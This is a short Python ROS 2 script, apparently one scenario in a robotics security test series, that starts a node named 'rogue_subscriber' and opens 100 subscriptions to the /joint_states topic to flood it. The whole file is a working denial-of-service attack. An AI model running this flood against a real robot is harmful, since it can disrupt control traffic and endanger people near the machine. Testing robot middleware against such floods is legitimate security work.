"""Subscriber flood (C2/C3): one rogue participant opens many subscriptions to /joint_states."""
import rclpy
from rclpy.node import Node
from sensor_msgs.msg import JointState
N = 100
class Flood(Node):
    def __init__(self):
        super().__init__("rogue_subscriber")
        self.subs = [self.create_subscription(JointState, "/joint_states", lambda m: None, 10) for _ in range(N)]
rclpy.init(); rclpy.spin(Flood())
